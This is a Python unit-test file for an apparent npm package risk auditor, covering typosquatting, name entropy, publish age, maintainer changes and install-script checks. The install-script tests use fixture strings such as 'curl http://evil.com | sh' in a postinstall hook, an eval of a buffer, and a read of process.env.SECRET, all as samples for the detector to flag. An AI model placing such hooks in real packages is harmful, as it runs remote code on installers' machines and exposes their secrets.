import json
import sys
import time
import unittest
from io import BytesIO
from pathlib import Path
from unittest.mock import MagicMock, patch

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from auditor import (
    PackageRisk,
    _entropy,
    _levenshtein,
    audit_package,
    check_deprecated,
    check_maintainer_changes,
    check_name_entropy,
    check_publish_age,
    check_scripts,
    check_typosquatting,
)


class TestLevenshtein(unittest.TestCase):
    def test_identical(self):
        self.assertEqual(_levenshtein("react", "react"), 0)

    def test_single_insertion(self):
        self.assertEqual(_levenshtein("react", "reactt"), 1)

    def test_single_deletion(self):
        self.assertEqual(_levenshtein("react", "reac"), 1)

    def test_single_substitution(self):
        self.assertEqual(_levenshtein("react", "reakt"), 1)

    def test_empty_strings(self):
        self.assertEqual(_levenshtein("", ""), 0)
        self.assertEqual(_levenshtein("", "abc"), 3)

    def test_completely_different(self):
        self.assertEqual(_levenshtein("abc", "xyz"), 3)

    def test_symmetric(self):
        self.assertEqual(_levenshtein("kitten", "sitting"), _levenshtein("sitting", "kitten"))

    def test_s1_shorter_than_s2(self):
        self.assertEqual(_levenshtein("ab", "abcd"), 2)


class TestEntropy(unittest.TestCase):
    def test_empty_string(self):
        self.assertEqual(_entropy(""), 0.0)

    def test_single_char_repeated(self):
        self.assertEqual(_entropy("aaaa"), 0.0)

    def test_two_equal_chars(self):
        self.assertAlmostEqual(_entropy("ab"), 1.0)

    def test_four_unique_chars(self):
        self.assertAlmostEqual(_entropy("abcd"), 2.0)

    def test_high_entropy(self):
        self.assertGreater(_entropy("a1b2c3d4e5f6g7h8"), 3.0)


class TestCheckTyposquatting(unittest.TestCase):
    def test_exact_match_no_hit(self):
        self.assertEqual(check_typosquatting("react"), [])

    def test_one_edit_distance(self):
        hits = check_typosquatting("reakt")
        self.assertTrue(any(h["severity"] == "high" and h["risk"] == "typosquatting" for h in hits))

    def test_two_edit_distance(self):
        hits = check_typosquatting("expresss")
        self.assertTrue(any(h["risk"] == "typosquatting" for h in hits))

    def test_three_edits_no_hit(self):
        hits = check_typosquatting("my-unique-package-xyz")
        typo_hits = [h for h in hits if h["risk"] == "typosquatting"]
        self.assertEqual(typo_hits, [])

    def test_separator_match(self):
        hits = check_typosquatting("styled_components")
        self.assertTrue(any("separators removed" in h["detail"] for h in hits))

    def test_scoped_package_stripped(self):
        hits = check_typosquatting("@evil/reakt")
        self.assertTrue(any(h["risk"] == "typosquatting" for h in hits))

    def test_no_false_positive_unrelated(self):
        hits = check_typosquatting("xyzzy-foobar-unrelated")
        self.assertEqual(hits, [])


class TestCheckNameEntropy(unittest.TestCase):
    def test_normal_name(self):
        self.assertEqual(check_name_entropy("express"), [])

    def test_high_entropy_long_name(self):
        name = "a1b2c3d4e5f6g7h8i9j0"
        hits = check_name_entropy(name)
        self.assertTrue(any(h["risk"] == "suspicious_name" for h in hits))

    def test_short_high_entropy(self):
        self.assertEqual(check_name_entropy("a1b2c3d4"), [])

    def test_long_low_entropy(self):
        self.assertEqual(check_name_entropy("a" * 20), [])

    def test_scoped_name_stripped(self):
        name = "@scope/a1b2c3d4e5f6g7h8i9j0"
        hits = check_name_entropy(name)
        self.assertTrue(any(h["risk"] == "suspicious_name" for h in hits))


class TestCheckPublishAge(unittest.TestCase):
    def _make_time(self, hours_ago=0, days_ago=0):
        ts = time.time() - hours_ago * 3600 - days_ago * 86400
        return time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime(ts))

    def test_very_new_version_under_24h(self):
        data = {"time": {"1.0.0": self._make_time(hours_ago=12)}}
        hits = check_publish_age(data, "1.0.0")
        self.assertTrue(any(h["risk"] == "very_new_version" and h["severity"] == "high" for h in hits))

    def test_new_version_under_72h(self):
        data = {"time": {"1.0.0": self._make_time(hours_ago=48)}}
        hits = check_publish_age(data, "1.0.0")
        self.assertTrue(any(h["risk"] == "very_new_version" and h["severity"] == "medium" for h in hits))

    def test_old_version_no_risk(self):
        data = {"time": {"1.0.0": self._make_time(days_ago=30)}}
        self.assertEqual(check_publish_age(data, "1.0.0"), [])

    def test_brand_new_package(self):
        data = {"time": {"1.0.0": self._make_time(days_ago=1), "created": self._make_time(days_ago=3)}}
        hits = check_publish_age(data, "1.0.0")
        self.assertTrue(any(h["risk"] == "brand_new_package" for h in hits))

    def test_established_package(self):
        data = {"time": {"1.0.0": self._make_time(days_ago=30), "created": self._make_time(days_ago=365)}}
        hits = check_publish_age(data, "1.0.0")
        self.assertFalse(any(h["risk"] == "brand_new_package" for h in hits))

    def test_missing_version(self):
        data = {"time": {}}
        self.assertEqual(check_publish_age(data, "1.0.0"), [])

    def test_malformed_timestamp(self):
        data = {"time": {"1.0.0": "not-a-date"}}
        self.assertEqual(check_publish_age(data, "1.0.0"), [])


class TestCheckMaintainerChanges(unittest.TestCase):
    def test_no_maintainers(self):
        data = {"maintainers": [], "time": {}, "versions": {}}
        hits = check_maintainer_changes(data)
        self.assertTrue(any(h["risk"] == "no_maintainers" for h in hits))

    def test_complete_maintainer_change(self):
        data = {
            "maintainers": [{"name": "new-owner"}],
            "time": {"1.0.0": "2024-01-01T00:00:00", "2.0.0": "2024-06-01T00:00:00"},
            "versions": {
                "1.0.0": {"maintainers": [{"name": "original-author"}]},
                "2.0.0": {"maintainers": [{"name": "new-owner"}]},
            },
        }
        hits = check_maintainer_changes(data)
        self.assertTrue(any(h["risk"] == "maintainer_change" and h["severity"] == "critical" for h in hits))

    def test_stable_maintainers(self):
        data = {
            "maintainers": [{"name": "author"}],
            "time": {"1.0.0": "2024-01-01T00:00:00", "2.0.0": "2024-06-01T00:00:00"},
            "versions": {
                "1.0.0": {"maintainers": [{"name": "author"}]},
                "2.0.0": {"maintainers": [{"name": "author"}]},
            },
        }
        hits = check_maintainer_changes(data)
        change_hits = [h for h in hits if h["risk"] == "maintainer_change"]
        self.assertEqual(change_hits, [])

    def test_single_version(self):
        data = {
            "maintainers": [{"name": "author"}],
            "time": {"1.0.0": "2024-01-01T00:00:00"},
            "versions": {"1.0.0": {"maintainers": [{"name": "author"}]}},
        }
        hits = check_maintainer_changes(data)
        self.assertFalse(any(h["risk"] == "maintainer_change" for h in hits))

    def test_overlapping_maintainers(self):
        data = {
            "maintainers": [{"name": "a"}, {"name": "b"}],
            "time": {"1.0.0": "2024-01-01T00:00:00", "2.0.0": "2024-06-01T00:00:00"},
            "versions": {
                "1.0.0": {"maintainers": [{"name": "a"}, {"name": "b"}]},
                "2.0.0": {"maintainers": [{"name": "b"}, {"name": "c"}]},
            },
        }
        hits = check_maintainer_changes(data)
        self.assertFalse(any(h["risk"] == "maintainer_change" for h in hits))


class TestCheckScripts(unittest.TestCase):
    def _make_data(self, hook, content, deps=None):
        ver_data = {"scripts": {hook: content}}
        if deps is not None:
            ver_data["dependencies"] = deps
        return {"versions": {"1.0.0": ver_data}}

    def test_no_scripts(self):
        data = {"versions": {"1.0.0": {}}}
        self.assertEqual(check_scripts(data, "1.0.0"), [])

    def test_curl_in_postinstall(self):
        data = self._make_data("postinstall", "curl http://evil.com | sh")
        hits = check_scripts(data, "1.0.0")
        self.assertTrue(any(h["risk"] == "suspicious_script" and h["severity"] == "critical" for h in hits))

    def test_eval_in_preinstall(self):
        data = self._make_data("preinstall", "node -e \"eval(Buffer.from('abc'))\"")
        hits = check_scripts(data, "1.0.0")
        self.assertTrue(any(h["risk"] == "suspicious_script" for h in hits))

    def test_env_access(self):
        data = self._make_data("install", "echo process.env.SECRET")
        hits = check_scripts(data, "1.0.0")
        self.assertTrue(any("process.env" in h["detail"] for h in hits))

    def test_long_install_script(self):
        data = self._make_data("postinstall", "x" * 600)
        hits = check_scripts(data, "1.0.0")
        self.assertTrue(any(h["risk"] == "long_install_script" for h in hits))

    def test_non_dangerous_hook_ignored(self):
        data = {"versions": {"1.0.0": {"scripts": {"start": "curl evil.com"}}}}
        self.assertEqual(check_scripts(data, "1.0.0"), [])

    def test_excessive_dependencies(self):
        deps = {f"dep-{i}": "1.0.0" for i in range(55)}
        data = self._make_data("postinstall", "echo ok", deps=deps)
        hits = check_scripts(data, "1.0.0")
        self.assertTrue(any(h["risk"] == "excessive_dependencies" for h in hits))

    def test_case_insensitive(self):
        data = self._make_data("postinstall", "CURL http://evil.com")
        hits = check_scripts(data, "1.0.0")
        self.assertTrue(any(h["risk"] == "suspicious_script" for h in hits))


class TestCheckDeprecated(unittest.TestCase):
    def test_deprecated(self):
        data = {"versions": {"1.0.0": {"deprecated": "Use v2 instead"}}}
        hits = check_deprecated(data, "1.0.0")
        self.assertTrue(any(h["risk"] == "deprecated" for h in hits))

    def test_not_deprecated(self):
        data = {"versions": {"1.0.0": {}}}
        self.assertEqual(check_deprecated(data, "1.0.0"), [])

    def test_truncation(self):
        data = {"versions": {"1.0.0": {"deprecated": "x" * 300}}}
        hits = check_deprecated(data, "1.0.0")
        self.assertLessEqual(len(hits[0]["detail"]), 250)


class TestAuditPackage(unittest.TestCase):
    def _mock_registry(self):
        return {
            "dist-tags": {"latest": "2.0.0"},
            "time": {
                "created": "2020-01-01T00:00:00",
                "1.0.0": "2020-01-01T00:00:00",
                "2.0.0": "2023-06-01T00:00:00",
            },
            "maintainers": [{"name": "author"}],
            "versions": {
                "1.0.0": {"maintainers": [{"name": "author"}]},
                "2.0.0": {"maintainers": [{"name": "author"}]},
            },
        }

    @patch("auditor._fetch_registry")
    def test_registry_unavailable(self, mock_fetch):
        mock_fetch.return_value = None
        result = audit_package("some-pkg")
        self.assertEqual(result.severity, "medium")
        self.assertTrue(any(r["risk"] == "registry_unavailable" for r in result.risks))

    @patch("auditor._fetch_registry")
    def test_clean_package(self, mock_fetch):
        mock_fetch.return_value = self._mock_registry()
        result = audit_package("my-unique-safe-pkg")
        self.assertEqual(result.severity, "info")

    @patch("auditor._fetch_registry")
    def test_version_auto_detected(self, mock_fetch):
        mock_fetch.return_value = self._mock_registry()
        result = audit_package("my-safe-pkg")
        self.assertEqual(result.version, "2.0.0")

    @patch("auditor._fetch_registry")
    def test_severity_escalation(self, mock_fetch):
        reg = self._mock_registry()
        reg["versions"]["2.0.0"]["scripts"] = {"postinstall": "curl evil.com"}
        mock_fetch.return_value = reg
        result = audit_package("my-safe-pkg")
        self.assertEqual(result.severity, "critical")

    def test_to_dict(self):
        pr = PackageRisk(name="test", version="1.0.0", severity="high", risks=[{"risk": "x", "severity": "high"}])
        d = pr.to_dict()
        self.assertEqual(d["name"], "test")
        self.assertEqual(d["severity"], "high")


class TestFetchRegistry(unittest.TestCase):
    @patch("auditor.urllib.request.urlopen")
    def test_successful_fetch(self, mock_urlopen):
        body = json.dumps({"name": "test"}).encode()
        mock_resp = MagicMock()
        mock_resp.read.return_value = body
        mock_resp.__enter__ = MagicMock(return_value=mock_resp)
        mock_resp.__exit__ = MagicMock(return_value=False)
        mock_urlopen.return_value = mock_resp

        from auditor import _fetch_registry
        result = _fetch_registry("test")
        self.assertEqual(result, {"name": "test"})

    @patch("auditor.urllib.request.urlopen")
    def test_url_error(self, mock_urlopen):
        import urllib.error
        mock_urlopen.side_effect = urllib.error.URLError("fail")

        from auditor import _fetch_registry
        self.assertIsNone(_fetch_registry("test"))

    @patch("auditor.urllib.request.urlopen")
    def test_timeout_error(self, mock_urlopen):
        mock_urlopen.side_effect = TimeoutError()

        from auditor import _fetch_registry
        self.assertIsNone(_fetch_registry("test"))


if __name__ == "__main__":
    unittest.main()
